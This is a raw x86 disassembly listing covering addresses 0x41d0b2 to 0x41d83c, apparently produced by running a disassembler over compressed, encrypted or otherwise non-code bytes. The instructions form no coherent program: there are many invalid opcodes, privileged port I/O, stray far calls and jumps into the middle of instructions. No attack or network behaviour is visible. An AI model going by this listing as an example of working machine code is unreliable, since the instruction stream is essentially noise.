  41d0b2:	test   al,0x89
  41d0b4:	and    al,BYTE PTR [edi-0x4a55ca86]
  41d0ba:	enter  0x5b53,0x27
  41d0be:	jae    0x41d086
  41d0c0:	not    WORD PTR [esi-0x5f423d85]
  41d0c7:	mov    WORD PTR [edx],fs
  41d0c9:	jns    0x41d13a
  41d0cb:	push   esp
  41d0cc:	test   al,0x6a
  41d0ce:	(bad)  
  41d0cf:	push   ecx
  41d0d0:	sub    ah,dh
  41d0d2:	cmp    al,BYTE PTR [edi-0x70]
  41d0d5:	aaa    
  41d0d6:	es out 0x12,eax
  41d0d9:	or     DWORD PTR [edi+eax*8-0x5f],eax
  41d0dd:	iret   
  41d0de:	push   edi
  41d0df:	fild   QWORD PTR [edi]
  41d0e1:	mov    DWORD PTR [edi-0x5a44a029],edi
  41d0e7:	jnp    0x41d081
  41d0e9:	xchg   edi,eax
  41d0ea:	sar    dh,1
  41d0ec:	out    dx,al
  41d0ed:	mov    ebp,0xa167561f
  41d0f2:	pop    edx
  41d0f3:	or     edi,DWORD PTR [edx+0x45]
  41d0f6:	and    eax,0xd9abbe28
  41d0fb:	lods   al,BYTE PTR ds:[esi]
  41d0fc:	mov    edx,0xdf7a56a7
  41d101:	jp     0x41d176
  41d103:	std    
  41d104:	popa   
  41d105:	inc    eax
  41d106:	call   0xe0e9e764
  41d10b:	pop    edi
  41d10c:	and    eax,0xa7dacfc7
  41d111:	xchg   esi,eax
  41d112:	and    al,0xeb
  41d114:	inc    edx
  41d115:	and    DWORD PTR [ecx],ebx
  41d117:	sti    
  41d118:	xchg   edx,eax
  41d119:	mov    al,ds:0xc168faaf
  41d11e:	cwde   
  41d11f:	hlt    
  41d120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d121:	push   esi
  41d122:	xor    eax,0xeadf7fbd
  41d127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d128:	add    eax,edi
  41d12a:	cmc    
  41d12b:	mov    ss,edi
  41d12d:	sub    ecx,ebx
  41d12f:	(bad)  
  41d130:	sbb    al,0xf
  41d132:	sbb    ch,BYTE PTR [esi+0x49]
  41d135:	jnp    0x41d13e
  41d137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d138:	xchg   DWORD PTR [ebp+0x27b088f5],edx
  41d13e:	shl    ebx,cl
  41d140:	mov    bl,0x9d
  41d142:	xchg   esp,eax
  41d143:	mov    eax,ds:0x869580a1
  41d148:	fs mov ecx,0x4e3170ef
  41d14e:	mov    ds:0x8672edad,eax
  41d153:	stc    
  41d154:	sti    
  41d155:	sub    eax,DWORD PTR [esi+0x5b117318]
  41d15b:	in     eax,0x43
  41d15d:	lea    edi,[edi+0x69]
  41d160:	and    eax,0x5d2ddf7c
  41d165:	pop    esp
  41d166:	out    0xc7,eax
  41d168:	or     eax,0x1b0155bd
  41d16d:	and    DWORD PTR [eax-0x277fc3a9],esi
  41d173:	dec    esp
  41d174:	lods   eax,DWORD PTR ds:[esi]
  41d175:	sahf   
  41d176:	outs   dx,DWORD PTR ds:[esi]
  41d177:	lds    esp,FWORD PTR [edi-0x1b68e13d]
  41d17d:	sub    ah,BYTE PTR [esi+0x64]
  41d180:	ja     0x41d127
  41d182:	pop    esp
  41d183:	mov    ecx,0x32895b80
  41d188:	arpl   WORD PTR [esi-0x25],dx
  41d18b:	stc    
  41d18c:	inc    esi
  41d18d:	push   ebx
  41d18e:	sub    DWORD PTR [ebx-0x74],ebx
  41d191:	sub    BYTE PTR [ebp*2-0x47049c22],ah
  41d198:	je     0x41d13c
  41d19a:	(bad)  [ecx-0x40709e7c]
  41d1a0:	and    eax,0x1ce0c7b9
  41d1a5:	pusha  
  41d1a6:	ret    
  41d1a7:	jl     0x41d147
  41d1a9:	inc    esp
  41d1aa:	inc    esi
  41d1ab:	mov    DWORD PTR [eax],ebp
  41d1ad:	cmp    DWORD PTR [esi],eax
  41d1af:	push   edx
  41d1b0:	pop    edi
  41d1b1:	icebp  
  41d1b2:	sub    al,0x60
  41d1b4:	xchg   DWORD PTR [eax+eax*8],ecx
  41d1b7:	ror    DWORD PTR [esi-0x1e3b79c6],0x1b
  41d1be:	jg     0x41d1ae
  41d1c0:	mov    bl,0x18
  41d1c2:	mov    ds:0x9728fc8d,al
  41d1c7:	or     BYTE PTR [esi+esi*4-0x327db9ed],bh
  41d1ce:	das    
  41d1cf:	and    DWORD PTR [ecx],esp
  41d1d1:	leave  
  41d1d2:	mov    dl,0x6b
  41d1d4:	test   ax,0x9426
  41d1d8:	aas    
  41d1d9:	test   cl,dl
  41d1db:	jp     0x41d23b
  41d1dd:	xor    BYTE PTR [ebx-0x2c510293],cl
  41d1e3:	loop   0x41d174
  41d1e5:	jns    0x41d185
  41d1e7:	jl     0x41d207
  41d1e9:	imul   ebp,DWORD PTR [ecx+0xb],0x7973be5e
  41d1f0:	sar    ebp,0x99
  41d1f3:	out    dx,al
  41d1f4:	inc    ecx
  41d1f5:	and    eax,0x9c692864
  41d1fa:	dec    ebx
  41d1fb:	fwait
  41d1fc:	repz int3 
  41d1fe:	push   edi
  41d1ff:	fmul   DWORD PTR [edi-0x27cf5a91]
  41d205:	pop    es
  41d206:	retf   
  41d207:	xor    BYTE PTR [ebx+esi*2+0x66],cl
  41d20b:	mov    ds:0xd382f5ac,al
  41d210:	fsubr  DWORD PTR [ecx+0x2f]
  41d213:	sahf   
  41d214:	mov    ebp,0x9ad40872
  41d219:	mov    ch,0xe8
  41d21b:	popf   
  41d21c:	xchg   edi,eax
  41d21d:	jo     0x41d24c
  41d21f:	lods   al,BYTE PTR ds:[esi]
  41d220:	in     eax,dx
  41d221:	pusha  
  41d222:	rol    BYTE PTR [edi+ebx*8-0x64a520f1],0xb6
  41d22a:	dec    edx
  41d22b:	dec    esp
  41d22c:	or     cl,bh
  41d22e:	xchg   ecx,eax
  41d22f:	xchg   ecx,eax
  41d230:	sub    eax,0x31a8d637
  41d235:	je     0x41d273
  41d237:	pop    edx
  41d238:	and    edi,0x9790d0e3
  41d23e:	out    dx,eax
  41d23f:	mov    ebp,cs
  41d241:	into   
  41d242:	lods   eax,DWORD PTR ds:[esi]
  41d243:	shl    BYTE PTR ds:0xc9daee13,cl
  41d24a:	jbe    0x41d217
  41d24c:	lock lea edi,[edi]
  41d24f:	sti    
  41d250:	arpl   WORD PTR [edi+0x6a],si
  41d253:	push   esp
  41d254:	retf   
  41d255:	std    
  41d256:	aas    
  41d257:	hlt    
  41d258:	call   0xa53c:0xebc18635
  41d25f:	mov    ch,0xb
  41d261:	inc    ebp
  41d262:	xor    al,ah
  41d264:	out    dx,eax
  41d265:	dec    eax
  41d266:	test   DWORD PTR [ebx],ecx
  41d268:	sbb    DWORD PTR [ecx+ebp*2+0x65],ebp
  41d26c:	fdivp  st(6),st
  41d26e:	js     0x41d281
  41d270:	rcl    BYTE PTR [eax-0x6b],cl
  41d273:	je     0x41d263
  41d275:	mov    ebx,0x6dc7bc1f
  41d27a:	add    bl,dl
  41d27c:	sbb    esp,eax
  41d27e:	rol    DWORD PTR [ecx],1
  41d280:	jge    0x41d2c8
  41d282:	in     eax,0x8c
  41d284:	in     ax,dx
  41d286:	adc    dl,0x66
  41d289:	loope  0x41d278
  41d28b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d28c:	pop    edi
  41d28d:	daa    
  41d28e:	test   BYTE PTR [ecx+ecx*2+0x1f],0x38
  41d293:	mov    ebx,0xeedbf143
  41d298:	mov    ds:0xe1b5fa16,eax
  41d29d:	rcr    DWORD PTR [ebp+0x24a01c7e],cl
  41d2a3:	pusha  
  41d2a4:	call   0x6a478c16
  41d2a9:	dec    esi
  41d2aa:	pushf  
  41d2ab:	imul   BYTE PTR [esi]
  41d2ad:	das    
  41d2ae:	dec    ecx
  41d2af:	jl     0x41d256
  41d2b1:	bswap  edi
  41d2b3:	add    al,0xc3
  41d2b5:	pop    edi
  41d2b6:	ja     0x41d2b3
  41d2b8:	mov    ebx,0x4b00285b
  41d2bd:	test   BYTE PTR [edi+0x49],dh
  41d2c0:	or     al,0x17
  41d2c2:	xchg   edi,eax
  41d2c3:	push   esp
  41d2c4:	mov    dl,0xf9
  41d2c6:	xchg   ecx,esi
  41d2c8:	fldenv [edi]
  41d2ca:	icebp  
  41d2cb:	aad    0x50
  41d2cd:	cmp    eax,0xb94357f1
  41d2d2:	int    0xb2
  41d2d4:	pusha  
  41d2d5:	in     al,dx
  41d2d6:	jmp    0x41d2c1
  41d2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2d9:	and    si,bp
  41d2dc:	push   edx
  41d2dd:	or     esp,DWORD PTR ds:0xd7e28d80
  41d2e3:	les    edx,FWORD PTR ds:0xbfadacff
  41d2e9:	mov    al,0x9
  41d2eb:	call   0x13aa5b31
  41d2f0:	cmp    ah,BYTE PTR [edx]
  41d2f2:	or     al,0x3e
  41d2f4:	inc    edx
  41d2f5:	dec    ebp
  41d2f6:	ss inc ecx
  41d2f8:	cmp    ebp,edi
  41d2fa:	mov    eax,0x965781b4
  41d2ff:	mov    bl,0x93
  41d301:	outs   dx,BYTE PTR ds:[esi]
  41d302:	jg     0x41d37b
  41d304:	lds    ebp,FWORD PTR ds:[ebp-0x51fbb372]
  41d30b:	ins    BYTE PTR es:[edi],dx
  41d30c:	aad    0xfe
  41d30e:	aas    
  41d30f:	lds    ebp,FWORD PTR [ecx+0x2e]
  41d312:	sahf   
  41d313:	pop    ds
  41d314:	(bad)  
  41d316:	jecxz  0x41d2a5
  41d318:	add    bl,ah
  41d31a:	push   edi
  41d31b:	mov    ?,WORD PTR [ebx+0x70]
  41d31e:	jns    0x41d2c1
  41d320:	sbb    DWORD PTR [edi+0x59],eax
  41d323:	or     eax,0x5e403adc
  41d328:	mov    bh,0x87
  41d32a:	das    
  41d32b:	cmp    eax,0xd7d329b0
  41d330:	iret   
  41d331:	scas   al,BYTE PTR es:[edi]
  41d332:	retf   0xe2fa
  41d335:	into   
  41d336:	push   ecx
  41d337:	ja     0x41d2c1
  41d339:	(bad)  
  41d33a:	mov    ds:0x26ab0987,al
  41d33f:	push   esi
  41d340:	push   cs
  41d341:	mov    dh,0xe
  41d343:	inc    ebp
  41d344:	mov    WORD PTR ds:0xd4fcf308,es
  41d34a:	cmp    BYTE PTR [ecx-0x71],ah
  41d34d:	cmp    bh,BYTE PTR [edi+0x4fe601ea]
  41d353:	cmp    ah,BYTE PTR [ecx-0x3fac79cf]
  41d359:	(bad)  
  41d35a:	xchg   ebx,eax
  41d35b:	xor    ah,ch
  41d35d:	or     BYTE PTR [esi],bl
  41d35f:	int3   
  41d360:	pop    ecx
  41d361:	adc    eax,0x455f9b97
  41d366:	jns    0x41d356
  41d368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d369:	jg     0x41d301
  41d36b:	pop    ecx
  41d36c:	pop    esi
  41d36d:	and    ch,dl
  41d36f:	neg    BYTE PTR [eax+0x49d9e7cd]
  41d375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d376:	or     eax,0x4b7cad02
  41d37b:	fst    DWORD PTR [edx+0x4f]
  41d37e:	ins    DWORD PTR es:[edi],dx
  41d37f:	in     al,dx
  41d380:	in     al,0xdf
  41d382:	and    edx,0xf35efdf
  41d388:	sub    edx,ecx
  41d38a:	call   0x7252:0x49b79cea
  41d391:	jecxz  0x41d32b
  41d393:	pop    esi
  41d394:	call   0x3b928b83
  41d399:	call   0xb138:0xa71d0980
  41d3a0:	call   0x23be:0xdd896fd8
  41d3a7:	or     DWORD PTR [ecx+0x7d],eax
  41d3aa:	push   cs
  41d3ab:	call   0x429c:0x44c3000a
  41d3b2:	push   DWORD PTR [ecx-0x735027f9]
  41d3b8:	and    BYTE PTR [edx-0x19],cl
  41d3bb:	ja     0x41d347
  41d3bd:	ret    
  41d3be:	sbb    al,0x2a
  41d3c0:	jecxz  0x41d39a
  41d3c2:	xchg   ebp,eax
  41d3c3:	mov    dh,0x4f
  41d3c5:	push   ebp
  41d3c6:	inc    ebp
  41d3c7:	out    dx,al
  41d3c8:	nop
  41d3c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3ca:	xchg   esp,eax
  41d3cb:	mov    DWORD PTR [ecx-0x5951d10a],esi
  41d3d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3d2:	or     bh,BYTE PTR [ecx+0x10bb944a]
  41d3d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3d9:	jae    0x41d42b
  41d3db:	fs jmp 0xec7985f
  41d3e1:	in     eax,0x3a
  41d3e3:	jne    0x41d39b
  41d3e5:	jns    0x41d417
  41d3e7:	xor    al,0xd8
  41d3e9:	cmp    DWORD PTR ss:[ecx+0x34c85053],eax
  41d3f0:	je     0x41d37e
  41d3f2:	mov    dl,0x94
  41d3f4:	int3   
  41d3f5:	aaa    
  41d3f6:	push   cs
  41d3f7:	dec    ebx
  41d3f8:	mov    ebp,0x751827ab
  41d3fd:	leave  
  41d3fe:	call   0x7f612a89
  41d403:	stc    
  41d404:	ret    0x1057
  41d407:	call   0xf2b8:0x2b4380
  41d40e:	push   ebx
  41d40f:	icebp  
  41d410:	ss inc ebp
  41d412:	lods   eax,DWORD PTR ds:[esi]
  41d413:	lahf   
  41d414:	loope  0x41d416
  41d416:	scas   al,BYTE PTR es:[edi]
  41d417:	(bad)  
  41d418:	xchg   ebx,eax
  41d419:	mov    ah,0x32
  41d41b:	xor    eax,0x8ba7a4c
  41d420:	adc    ah,dh
  41d422:	enter  0xafc8,0x6a
  41d426:	sub    BYTE PTR [ecx+0x6c],bl
  41d429:	xor    eax,0xbd7dc813
  41d42e:	sbb    al,0x44
  41d430:	popa   
  41d431:	jecxz  0x41d411
  41d433:	in     eax,0x6b
  41d435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d436:	arpl   WORD PTR [edx-0x2efd2bcf],bx
  41d43c:	bound  eax,QWORD PTR [ecx]
  41d43e:	clc    
  41d43f:	pusha  
  41d440:	cmc    
  41d441:	call   0x66b5:0x5ee4f118
  41d448:	pop    ds
  41d449:	dec    esp
  41d44a:	cmp    eax,0x446b53f3
  41d44f:	mov    BYTE PTR [edx],ch
  41d451:	test   al,0x9d
  41d453:	and    al,0xc9
  41d455:	stos   DWORD PTR es:[edi],eax
  41d456:	sbb    eax,0xa13a1c0b
  41d45b:	imul   edi,DWORD PTR [edx-0x2a],0xcf19e748
  41d462:	fisubr WORD PTR [eax+0x79]
  41d465:	call   0x7368419a
  41d46a:	push   edx
  41d46b:	pop    eax
  41d46c:	dec    edi
  41d46d:	dec    eax
  41d46e:	dec    edx
  41d46f:	rol    BYTE PTR [ebp+0x41],0xab
  41d473:	push   ebx
  41d474:	jbe    0x41d3fd
  41d476:	inc    edi
  41d477:	sti    
  41d478:	test   al,0xbd
  41d47a:	(bad)  
  41d47b:	(bad)
  41d47e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d47f:	push   edx
  41d480:	adc    al,BYTE PTR ds:[ecx]
  41d483:	xchg   DWORD PTR [ebp-0x42e67b57],esp
  41d489:	add    DWORD PTR cs:[eax],0x25
  41d48d:	in     al,0xe4
  41d48f:	xchg   ecx,eax
  41d490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d491:	fst    DWORD PTR [ebx+edi*8]
  41d494:	pop    edi
  41d495:	js     0x41d419
  41d497:	cli    
  41d498:	repnz inc ebx
  41d49a:	test   DWORD PTR ds:0x36698a89,esp
  41d4a0:	test   al,0xf6
  41d4a2:	fdiv   QWORD PTR [ebx-0x15]
  41d4a5:	out    dx,al
  41d4a6:	and    edx,DWORD PTR [edx+0x1a]
  41d4a9:	int    0x41
  41d4ab:	push   ds
  41d4ac:	dec    ecx
  41d4ad:	das    
  41d4ae:	pusha  
  41d4af:	in     eax,0x2d
  41d4b1:	pop    edi
  41d4b2:	cli    
  41d4b3:	lods   al,BYTE PTR ds:[esi]
  41d4b4:	imul   edx,DWORD PTR [ecx+0x4b293c6f],0xd7c48cc3
  41d4be:	nop
  41d4bf:	dec    ebx
  41d4c0:	mov    eax,ds:0xefc51ab7
  41d4c5:	retf   
  41d4c6:	push   edi
  41d4c7:	(bad)  
  41d4c8:	jmp    0x2071:0x7dc5c698
  41d4cf:	inc    esp
  41d4d0:	fs dec ebx
  41d4d2:	mov    ecx,0x1b0e676c
  41d4d7:	mov    ?,WORD PTR [eax-0x10835bdf]
  41d4dd:	fwait
  41d4de:	mov    esi,0x16570a4a
  41d4e3:	mov    ebx,0xddb9eb64
  41d4e8:	mov    ds:0xbb0eb8b3,al
  41d4ed:	xchg   ecx,eax
  41d4ee:	and    DWORD PTR [eax],0x31
  41d4f1:	repnz stos DWORD PTR es:[edi],eax
  41d4f3:	push   ebp
  41d4f4:	jb     0x41d49f
  41d4f6:	ds (bad) 
  41d4f9:	and    ecx,DWORD PTR [ebp-0xa]
  41d4fc:	inc    edx
  41d4fd:	cmp    BYTE PTR [edi+0x56],bh
  41d500:	shr    BYTE PTR [ecx+0x3d],0x16
  41d504:	rcl    BYTE PTR [edi],0x59
  41d507:	call   0x8c0e:0x2188703f
  41d50e:	or     BYTE PTR [ebx],dl
  41d510:	bound  ecx,QWORD PTR [ebx+0x16]
  41d513:	inc    esi
  41d514:	mov    ecx,0x71bb37da
  41d519:	xor    eax,0x44cb0df6
  41d51e:	repnz and edi,DWORD PTR [ecx]
  41d521:	lods   eax,DWORD PTR ds:[esi]
  41d522:	inc    BYTE PTR [eax]
  41d524:	or     edi,esp
  41d526:	aam    0xbf
  41d528:	mov    ecx,0xcc9e6bb5
  41d52d:	sbb    eax,0x15b98f59
  41d532:	xchg   ebp,eax
  41d533:	aam    0x7
  41d535:	mov    ebp,0xecba4b03
  41d53a:	(bad)  
  41d53b:	sar    bh,cl
  41d53d:	xchg   edx,eax
  41d53e:	stos   BYTE PTR es:[edi],al
  41d53f:	xor    DWORD PTR [edx-0x22b66ce6],ebp
  41d545:	fwait
  41d546:	call   0x1793:0xa318fda8
  41d54d:	mov    cl,ah
  41d54f:	lock mov ah,0x9d
  41d552:	fdivr  DWORD PTR [ecx+0x7363239d]
  41d558:	cmp    eax,ebx
  41d55a:	test   eax,0x53f42219
  41d55f:	xlat   BYTE PTR ds:[ebx]
  41d560:	or     ah,BYTE PTR [edi]
  41d562:	inc    edi
  41d563:	es push eax
  41d565:	fdiv   QWORD PTR [ebx-0x15]
  41d568:	into   
  41d569:	inc    edi
  41d56a:	mov    ds:0x9c5c491e,al
  41d56f:	jnp    0x41d556
  41d571:	je     0x41d545
  41d573:	rol    BYTE PTR [ebx],0xa4
  41d576:	push   es
  41d577:	cmp    BYTE PTR [eax],bh
  41d579:	add    bh,BYTE PTR [edx-0x40]
  41d57c:	and    esp,DWORD PTR cs:[ebx-0x6]
  41d580:	mov    dh,0xc
  41d582:	cld    
  41d583:	push   ds
  41d584:	repnz mov ah,0x4c
  41d587:	popa   
  41d588:	es xchg esi,eax
  41d58a:	lea    esp,[eax]
  41d58c:	and    edi,esi
  41d58e:	push   cs
  41d58f:	mul    cl
  41d591:	dec    edi
  41d592:	jl     0x41d5fb
  41d594:	mov    cl,0x52
  41d596:	aas    
  41d597:	jecxz  0x41d614
  41d599:	(bad)  
  41d59a:	mov    dh,0x42
  41d59c:	imul   ebp,DWORD PTR [edx],0x3d
  41d59f:	push   ds
  41d5a0:	cdq    
  41d5a1:	add    BYTE PTR [edx],cl
  41d5a3:	cwde   
  41d5a4:	lea    edi,[esi]
  41d5a6:	ins    BYTE PTR es:[edi],dx
  41d5a7:	and    eax,0xaf7b4146
  41d5ac:	test   esi,edx
  41d5ae:	mov    WORD PTR [ebx-0x1a3dd44a],?
  41d5b4:	mov    dl,0x3d
  41d5b6:	sub    al,BYTE PTR [edx]
  41d5b8:	fbstp  TBYTE PTR [esi-0x770b1829]
  41d5be:	xor    al,0x58
  41d5c0:	scas   eax,DWORD PTR es:[edi]
  41d5c1:	jmp    0x41d545
  41d5c3:	ror    BYTE PTR [esi],0x3f
  41d5c6:	out    dx,eax
  41d5c7:	inc    esp
  41d5c8:	xor    dh,BYTE PTR [eax]
  41d5ca:	ror    BYTE PTR [ecx+0x6],0x11
  41d5ce:	cmp    edi,ebp
  41d5d0:	sub    BYTE PTR [edi+edi*2-0x76dc36b5],ch
  41d5d7:	popf   
  41d5d8:	test   DWORD PTR [ebx+0x28],edi
  41d5db:	fwait
  41d5dc:	dec    ebp
  41d5dd:	call   0x4ad5:0xa00ecc11
  41d5e4:	adc    dl,dh
  41d5e6:	or     esp,esp
  41d5e8:	fdiv   DWORD PTR [ebx+edx*4-0x4d]
  41d5ec:	push   ds
  41d5ed:	jmp    0x7894e983
  41d5f2:	lahf   
  41d5f3:	scas   eax,DWORD PTR es:[edi]
  41d5f4:	add    eax,0xd4e34b47
  41d5f9:	or     eax,0x122a9e96
  41d5fe:	jl     0x41d5d5
  41d600:	inc    esi
  41d601:	or     BYTE PTR [edi+0x207101],dh
  41d607:	(bad)  
  41d608:	fnstcw WORD PTR [ebp+0x75]
  41d60b:	aam    0xb0
  41d60d:	fmul   QWORD PTR [esi-0x75]
  41d610:	pop    ds
  41d611:	repnz sahf 
  41d613:	cmp    ch,BYTE PTR [esi+0x39c2f5e7]
  41d619:	push   edx
  41d61a:	add    ah,BYTE PTR [esi-0x72]
  41d61d:	shl    DWORD PTR [esi+eiz*4],1
  41d620:	xor    bl,BYTE PTR [eax+0x5f]
  41d623:	cmp    al,BYTE PTR [edx+0x79]
  41d626:	(bad)  
  41d627:	push   ecx
  41d628:	xchg   bh,dl
  41d62a:	xor    eax,0xe4de4b93
  41d62f:	fild   WORD PTR [esi-0x143e0d40]
  41d635:	xor    eax,0xcf325e2b
  41d63a:	scas   eax,DWORD PTR es:[edi]
  41d63b:	and    esi,esi
  41d63d:	retf   0x30fc
  41d640:	and    BYTE PTR [ebx+0x78],bl
  41d643:	jno    0x41d63b
  41d645:	ss pusha 
  41d647:	mov    esi,0x19a4fb69
  41d64c:	xor    al,0x2a
  41d64e:	mov    bl,BYTE PTR [eax+0x7df00d0e]
  41d654:	stc    
  41d655:	mov    dl,0xd1
  41d657:	add    dh,dh
  41d659:	out    dx,al
  41d65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d65b:	retf   0xed0
  41d65e:	add    BYTE PTR [esi+eiz*1],ch
  41d661:	ins    DWORD PTR es:[edi],dx
  41d662:	stos   DWORD PTR es:[edi],eax
  41d663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d664:	(bad)  [eax-0xb]
  41d667:	sub    eax,0x8f533aca
  41d66c:	mov    dl,0xb1
  41d66e:	cli    
  41d66f:	and    esp,DWORD PTR [edi]
  41d671:	xor    bl,BYTE PTR [ecx-0x7e595c64]
  41d677:	dec    esp
  41d678:	xchg   BYTE PTR [ebx-0x6b8099f9],ch
  41d67e:	int3   
  41d67f:	xor    eax,0x7ec6dc83
  41d684:	and    BYTE PTR [eax],0xd6
  41d687:	lock loope 0x41d681
  41d68a:	push   es
  41d68b:	pop    es
  41d68c:	mov    eax,DWORD PTR [ecx+0x59]
  41d68f:	dec    esi
  41d690:	ret    
  41d691:	imul   BYTE PTR [esi+0x46]
  41d694:	test   eax,0x10b91e86
  41d699:	(bad)  
  41d69a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d69b:	ror    BYTE PTR fs:[edi+0x6331bad9],cl
  41d6a2:	pop    ebx
  41d6a3:	ret    
  41d6a4:	js     0x41d677
  41d6a6:	(bad)  
  41d6a7:	xor    al,0x57
  41d6a9:	hlt    
  41d6aa:	jns    0x41d662
  41d6ac:	imul   edi,DWORD PTR [ebp+0xc],0xffffffdf
  41d6b0:	addr16 push esp
  41d6b2:	jmp    0x41d65f
  41d6b4:	dec    eax
  41d6b5:	sub    BYTE PTR [edx],ch
  41d6b7:	and    eax,0x3e4c7b7d
  41d6bc:	clc    
  41d6bd:	enter  0xd952,0x2e
  41d6c1:	pop    esi
  41d6c2:	inc    edx
  41d6c3:	adc    ah,BYTE PTR [ebp-0x6f9c1e23]
  41d6c9:	bound  edi,QWORD PTR [ecx+0x77e8f21e]
  41d6cf:	push   ecx
  41d6d0:	fs mov esi,0xe0327adb
  41d6d6:	or     dl,BYTE PTR [ebx]
  41d6d8:	sbb    edx,DWORD PTR [edi+ecx*2]
  41d6db:	imul   edx,ecx,0x4724fa04
  41d6e1:	jae    0x41d6ce
  41d6e3:	push   esp
  41d6e4:	addr16 inc esi
  41d6e6:	jg     0x41d721
  41d6e8:	push   edx
  41d6e9:	mov    BYTE PTR [ecx+0x2bd1e9d1],cl
  41d6ef:	sbb    eax,0x603794ca
  41d6f4:	dec    ebp
  41d6f5:	cmp    eax,0x42ec9072
  41d6fa:	popf   
  41d6fb:	repz jmp 0x41d758
  41d6fe:	arpl   WORD PTR [ebx],bp
  41d700:	pop    esi
  41d701:	mov    edi,0x942dd270
  41d706:	xlat   BYTE PTR ds:[ebx]
  41d707:	pop    ebx
  41d708:	retf   0x99b0
  41d70b:	test   al,0xc1
  41d70d:	ins    BYTE PTR es:[edi],dx
  41d70e:	ja     0x41d6b7
  41d710:	mov    ds:0x575f3fa9,al
  41d715:	sbb    al,0x23
  41d717:	push   ds
  41d718:	xor    eax,0x4b859e2a
  41d71d:	push   0x33
  41d71f:	loope  0x41d6e7
  41d721:	sub    edx,eax
  41d723:	adc    al,0xac
  41d725:	xchg   BYTE PTR [ecx],bl
  41d727:	out    dx,eax
  41d728:	rol    DWORD PTR [edx-0x76a1cf57],1
  41d72e:	sbb    ch,BYTE PTR [ecx+eax*2+0x46676ac]
  41d735:	mov    ebx,0x5137334a
  41d73a:	mov    DWORD PTR [edi+0x2c],ecx
  41d73d:	adc    esp,DWORD PTR [ebx]
  41d73f:	push   esi
  41d740:	bound  esi,QWORD PTR [edx-0x51]
  41d743:	stos   DWORD PTR es:[edi],eax
  41d744:	(bad)  [esp+edi*4]
  41d747:	into   
  41d748:	mov    ah,0x3e
  41d74a:	(bad)  
  41d74b:	sub    BYTE PTR [edx-0x606ad1bf],ch
  41d751:	inc    esi
  41d752:	cmp    eax,0x9c14cc56
  41d757:	xor    eax,0x5496e7d5
  41d75c:	sbb    esp,DWORD PTR ds:0x91151ae6
  41d762:	add    eax,0x6445882c
  41d767:	aas    
  41d768:	mov    dl,0xeb
  41d76a:	pop    ebp
  41d76b:	arpl   WORD PTR [eax-0x6b],ax
  41d76e:	std    
  41d76f:	cmp    DWORD PTR [eax-0x58],0xffffff9a
  41d773:	cld    
  41d774:	jne    0x41d71b
  41d776:	lahf   
  41d777:	cmp    edx,edx
  41d779:	clc    
  41d77a:	mov    dh,0x16
  41d77c:	and    ch,ch
  41d77e:	pop    es
  41d77f:	sub    bl,dl
  41d781:	bound  ebx,QWORD PTR [edx-0x2e]
  41d784:	shr    DWORD PTR ds:0xc1820af5,1
  41d78a:	and    esi,DWORD PTR [eax]
  41d78c:	fs call 0x78a6641
  41d792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d793:	pop    es
  41d794:	and    DWORD PTR [eax+0x34],eax
  41d797:	data16 jo 0x41d745
  41d79a:	sbb    eax,0x32c662c8
  41d79f:	or     edx,DWORD PTR [ebx-0xd74f5b5]
  41d7a5:	sub    dl,BYTE PTR [esi-0x42602bdb]
  41d7ab:	add    DWORD PTR [eax+0x65bef081],0xf0f00b3a
  41d7b5:	mov    fs,ecx
  41d7b7:	outs   dx,BYTE PTR ds:[esi]
  41d7b8:	js     0x41d7e8
  41d7ba:	test   DWORD PTR [ebx-0x11],esp
  41d7bd:	neg    DWORD PTR [ecx+ecx*1+0x66]
  41d7c1:	push   esi
  41d7c2:	aas    
  41d7c3:	mov    ch,0xea
  41d7c5:	popf   
  41d7c6:	(bad)  
  41d7c7:	int3   
  41d7c8:	repnz dec ecx
  41d7ca:	adc    al,0x49
  41d7cc:	loope  0x41d760
  41d7ce:	out    dx,eax
  41d7cf:	xor    BYTE PTR [edi+0x45],bh
  41d7d2:	mov    ebx,ebx
  41d7d4:	aas    
  41d7d5:	aam    0x3e
  41d7d7:	test   eax,0xe20912a0
  41d7dc:	jl     0x41d806
  41d7de:	jbe    0x41d771
  41d7e0:	pusha  
  41d7e1:	ds pop esp
  41d7e3:	add    BYTE PTR [esp+ecx*2],ch
  41d7e6:	(bad)  
  41d7e7:	cmp    bl,ch
  41d7e9:	cmp    BYTE PTR [ecx-0x7b2d9c63],al
  41d7ef:	aad    0x89
  41d7f1:	push   esp
  41d7f2:	xor    BYTE PTR [esi],ah
  41d7f4:	call   0x98e2:0xa9f3dadf
  41d7fb:	cwde   
  41d7fc:	push   edi
  41d7fd:	call   0x751d33b2
  41d802:	jmp    0xbb70:0xfe1bade6
  41d809:	in     al,0xbe
  41d80b:	xchg   ebx,eax
  41d80c:	xor    al,0x93
  41d80e:	jp     0x41d837
  41d810:	jg     0x41d7d6
  41d812:	cmp    edi,DWORD PTR ds:0xa73d0b17
  41d818:	pop    ds
  41d819:	mov    ecx,0x5864fc72
  41d81e:	js     0x41d853
  41d820:	shl    BYTE PTR [ecx],1
  41d822:	xchg   edi,eax
  41d823:	lds    eax,FWORD PTR [edi]
  41d825:	add    ebp,DWORD PTR [edx+0x6e]
  41d828:	mov    ds:0x4d71f8b,eax
  41d82d:	sbb    DWORD PTR [ecx-0xd088d35],ebx
  41d833:	add    cl,BYTE PTR [ecx]
  41d835:	add    al,0x47
  41d837:	stos   BYTE PTR es:[edi],al
  41d838:	pushf  
  41d839:	cmp    al,0xc2
  41d83b:	cmc    
  41d83c:	pop    ds
